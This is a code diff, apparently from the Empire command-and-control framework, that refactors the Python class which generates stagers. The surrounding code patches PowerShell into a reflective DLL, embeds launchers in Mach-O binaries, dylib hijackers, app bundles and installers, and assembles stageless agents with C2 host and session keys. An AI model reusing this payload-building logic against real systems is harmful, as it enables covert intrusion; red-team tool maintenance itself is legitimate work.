@@ -59,10 +59,10 @@ class Stagers:
         )
         if encode:
             return helpers.powershell_launcher(stager, launcher)
-        else:
-            return stager
 
-    def generate_launcher(
+        return stager
+
+    def generate_launcher(  # noqa: PLR0913
         self,
         listenerName,
         language=None,
@@ -83,14 +83,14 @@ class Stagers:
         with SessionLocal.begin() as db:
             bypasses_parsed = []
             for bypass in bypasses.split(" "):
-                bypass = (
+                db_bypass = (
                     db.query(models.Bypass).filter(models.Bypass.name == bypass).first()
                 )
-                if bypass:
-                    if bypass.language == language:
-                        bypasses_parsed.append(bypass.code)
+                if db_bypass:
+                    if db_bypass.language == language:
+                        bypasses_parsed.append(db_bypass.code)
                     else:
-                        log.warning(f"Invalid bypass language: {bypass.language}")
+                        log.warning(f"Invalid bypass language: {db_bypass.language}")
 
             db_listener = self.mainMenu.listenersv2.get_by_name(db, listenerName)
             active_listener = self.mainMenu.listenersv2.get_active_listener(
@@ -115,6 +115,7 @@ class Stagers:
             )
             if launcher_code:
                 return launcher_code
+            return None
 
     def generate_dll(self, poshCode, arch):
         """
@@ -123,12 +124,12 @@ class Stagers:
 
         # read in original DLL and patch the bytes based on arch
         if arch.lower() == "x86":
-            origPath = "%s/data/misc/ReflectivePick_x86_orig.dll" % (
-                self.mainMenu.installPath
+            origPath = (
+                f"{self.mainMenu.installPath}/data/misc/ReflectivePick_x86_orig.dll"
             )
         else:
-            origPath = "%s/data/misc/ReflectivePick_x64_orig.dll" % (
-                self.mainMenu.installPath
+            origPath = (
+                f"{self.mainMenu.installPath}/data/misc/ReflectivePick_x64_orig.dll"
             )
 
         if os.path.isfile(origPath):
@@ -141,16 +142,15 @@ class Stagers:
                 # patch the dll with the new PowerShell code
                 searchString = (("Invoke-Replace").encode("UTF-16"))[2:]
                 index = dllRaw.find(searchString)
-                dllPatched = (
+                return (
                     dllRaw[:index]
                     + replacementCode
                     + dllRaw[(index + len(replacementCode)) :]
                 )
 
-                return dllPatched
-
         else:
             log.error(f"Original .dll for arch {arch} does not exist!")
+            return None
 
     def generate_powershell_exe(
         self, posh_code, dot_net_version="net40", obfuscate=False
@@ -178,8 +178,7 @@ class Stagers:
                 stager_yaml, "CSharpPS", confuse=obfuscate
             )
 
-        directory = f"{self.mainMenu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/{dot_net_version}/{file_name}.exe"
-        return directory
+        return f"{self.mainMenu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/{dot_net_version}/{file_name}.exe"
 
     def generate_powershell_shellcode(
         self, posh_code, arch="both", dot_net_version="net40"
@@ -245,9 +244,8 @@ class Stagers:
             (not obfuscate) or ("launcher" not in obfuscation_command.lower())
         ):
             return helpers.powershell_launcher(launcher, launcher_front)
-        else:
-            # otherwise return the case-randomized stager
-            return launcher
+        # otherwise return the case-randomized stager
+        return launcher
 
     def generate_python_exe(
         self, python_code, dot_net_version="net40", obfuscate=False
@@ -275,8 +273,7 @@ class Stagers:
                 stager_yaml, "CSharpPy", confuse=obfuscate
             )
 
-        directory = f"{self.mainMenu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/{dot_net_version}/{file_name}.exe"
-        return directory
+        return f"{self.mainMenu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/{dot_net_version}/{file_name}.exe"
 
     def generate_python_shellcode(
         self, posh_code, arch="both", dot_net_version="net40"
@@ -307,9 +304,7 @@ class Stagers:
 
         MH_EXECUTE = 2
         # with open(self.installPath + "/data/misc/machotemplate", 'rb') as f:
-        with open(
-            "%s/data/misc/machotemplate" % (self.mainMenu.installPath), "rb"
-        ) as f:
+        with open(f"{self.mainMenu.installPath}/data/misc/machotemplate", "rb") as f:
             macho = macholib.MachO.MachO(f.name)
 
             if int(macho.headers[0].header.filetype) != MH_EXECUTE:
@@ -345,15 +340,12 @@ class Stagers:
             )
             launcherCode = base64.urlsafe_b64encode(launcherCode.encode("utf-8"))
             launcher = launcherCode + b"\x00" * (placeHolderSz - len(launcherCode))
-            patchedMachO = (
-                template[:offset] + launcher + template[(offset + len(launcher)) :]
-            )
+            return template[:offset] + launcher + template[(offset + len(launcher)) :]
 
-            return patchedMachO
-        else:
-            log.error("Unable to patch MachO binary")
+        log.error("Unable to patch MachO binary")
+        return None
 
-    def generate_dylib(self, launcherCode, arch, hijacker):
+    def generate_dylib(self, launcherCode, arch, hijacker):  # noqa: PLR0912
         """
         Generates a dylib with an embedded python interpreter and runs launcher code when loaded into an application.
         """
@@ -365,11 +357,10 @@ class Stagers:
                 f = f"{self.mainMenu.installPath}/data/misc/hijackers/template.dylib"
             else:
                 f = f"{self.mainMenu.installPath}/data/misc/hijackers/template64.dylib"
+        elif arch == "x86":
+            f = f"{self.mainMenu.installPath}/data/misc/templateLauncher.dylib"
         else:
-            if arch == "x86":
-                f = f"{self.mainMenu.installPath}/data/misc/templateLauncher.dylib"
-            else:
-                f = f"{self.mainMenu.installPath}/data/misc/templateLauncher64.dylib"
+            f = f"{self.mainMenu.installPath}/data/misc/templateLauncher64.dylib"
 
         with open(f, "rb") as f:
             macho = macholib.MachO.MachO(f.name)
@@ -402,15 +393,16 @@ class Stagers:
             launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
             if isinstance(launcher, str):
                 launcher = launcher.encode("UTF-8")
-            patchedDylib = b"".join(
+            return b"".join(
                 [template[:offset], launcher, template[(offset + len(launcher)) :]]
             )
 
-            return patchedDylib
-        else:
-            log.error("Unable to patch dylib")
+        log.error("Unable to patch dylib")
+        return None
 
-    def generate_appbundle(self, launcherCode, Arch, icon, AppName, disarm):
+    def generate_appbundle(  # noqa: PLR0915, PLR0912
+        self, launcherCode, Arch, icon, AppName, disarm
+    ):
         """
         Generates an application. The embedded executable is a macho binary with the python interpreter.
         """
@@ -473,7 +465,7 @@ class Stagers:
             if AppName == "":
                 AppName = "launcher"
 
-            tmpdir = "/tmp/application/%s.app/" % AppName
+            tmpdir = f"/tmp/application/{AppName}.app/"
             shutil.copytree(directory, tmpdir)
             with open(tmpdir + "Contents/MacOS/launcher", "wb") as f:
                 if disarm is not True:
@@ -489,9 +481,9 @@ class Stagers:
 
             os.rename(
                 tmpdir + "Contents/MacOS/launcher",
-                tmpdir + "Contents/MacOS/%s" % AppName,
+                tmpdir + f"Contents/MacOS/{AppName}",
             )
-            os.chmod(tmpdir + "Contents/MacOS/%s" % AppName, 0o755)
+            os.chmod(tmpdir + f"Contents/MacOS/{AppName}", 0o755)
 
             if icon != "":
                 iconfile = os.path.splitext(icon)[0].split("/")[-1]
@@ -568,8 +560,8 @@ class Stagers:
             os.remove("/tmp/launcher.zip")
             return zipbundle
 
-        else:
-            log.error("Unable to patch application")
+        log.error("Unable to patch application")
+        return None
 
     def generate_pkg(self, launcher, bundleZip, AppName):
         # unzip application bundle zip. Copy everything for the installer pkg to a temporary location
@@ -655,8 +647,6 @@ class Stagers:
         except OSError as e:
             if e.errno != errno.EEXIST:
                 raise
-            else:
-                pass
 
         with open(jarpath + "Run.java", "w") as f:
             f.write(javacode)
@@ -697,9 +687,7 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
         file_encoded = base64.b64encode(file).decode("UTF-8")
 
         script = script.replace("BASE64_BLOB_GOES_HERE", file_encoded)
-        script = script.replace("FILE_UPLOAD_FULL_PATH_GOES_HERE", path)
-
-        return script
+        return script.replace("FILE_UPLOAD_FULL_PATH_GOES_HERE", path)
 
     def generate_stageless(self, options):
         listener_name = options["Listener"]["Value"]
@@ -778,18 +766,10 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
             )
 
             if options["Language"]["Value"] == "powershell":
-                launch_code = "\nInvoke-Empire -Servers @('{}') -StagingKey '{}' -SessionKey '{}' -SessionID '{}' -WorkingHours '{}' -KillDate '{}';".format(
-                    host,
-                    staging_key,
-                    session_key,
-                    session_id,
-                    working_hours,
-                    kill_date,
-                )
-                full_agent = comms_code + "\n" + agent_code + "\n" + launch_code
-                return full_agent
+                launch_code = f"\nInvoke-Empire -Servers @('{host}') -StagingKey '{staging_key}' -SessionKey '{session_key}' -SessionID '{session_id}' -WorkingHours '{working_hours}' -KillDate '{kill_date}';"
+                return comms_code + "\n" + agent_code + "\n" + launch_code
 
-            elif options["Language"]["Value"] in ["python", "ironpython"]:
+            if options["Language"]["Value"] in ["python", "ironpython"]:
                 stager_code = stager_code.replace(
                     "return b''.join(random.choice(string.ascii_uppercase + string.digits).encode('UTF-8') for _ in range(8))",
                     f"return b'{session_id}'",
@@ -805,6 +785,7 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
                 else:
                     full_agent = "\n".join([agent_code, stager_code, launch_code])
                 return full_agent
+            return None
 
 
 def replace_execute_function(code, session_key):
